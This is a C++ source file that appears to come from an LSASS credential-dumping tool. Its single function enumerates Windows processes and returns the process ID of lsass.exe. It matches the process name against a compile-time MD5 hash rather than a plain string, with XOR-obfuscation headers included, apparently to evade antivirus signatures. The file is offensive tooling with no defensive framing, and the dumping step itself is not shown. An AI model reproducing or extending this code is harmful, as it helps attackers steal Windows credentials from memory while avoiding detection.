#include "AxiomDumper.h"
#include "ElSass.h"
#include "Glibc.h"
#include "compiletime_md5.hpp"
#include "autoxor.h"
#include <psapi.h>
#include <stdio.h>

ULONG ELSASS_FindPid()
{
	static ULONG result = 0;
	DWORD aProcesses[2048];
	DWORD cbNeeded;
	DWORD cProcesses;

	if (result != 0)
		return (result);

	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
	{
		printf("[!] EnumProcesses() failed\n");
		return (0x00);
	}

	cProcesses = cbNeeded / sizeof(DWORD);
	for (size_t i = 0; i < cProcesses; i++)
	{
		if (i != 0)
		{
			DWORD processID = aProcesses[i];
			CHAR cname[1024];
			HANDLE handle = OpenProcess(
				PROCESS_QUERY_LIMITED_INFORMATION,
				FALSE,
				processID
			);
			if (handle)
			{
				DWORD buffSize = 1024;
				if (!QueryFullProcessImageNameA(handle, 0, cname, &buffSize)) {
					continue;
				}
			}
			else {
				continue;
			}

			char* filename = drunk_strrstr(cname, '\\');
			if (filename == NULL)
				continue;

			filename++;
			constexpr uint64_t lsassHash = compiletime_md5("lsass.exe");
			uint64_t pnameHash = compiletime_md5(filename);
			if (lsassHash == pnameHash)
			{
				result = aProcesses[i];
				return (aProcesses[i]);
			}
		}
	}
	return (0);
}

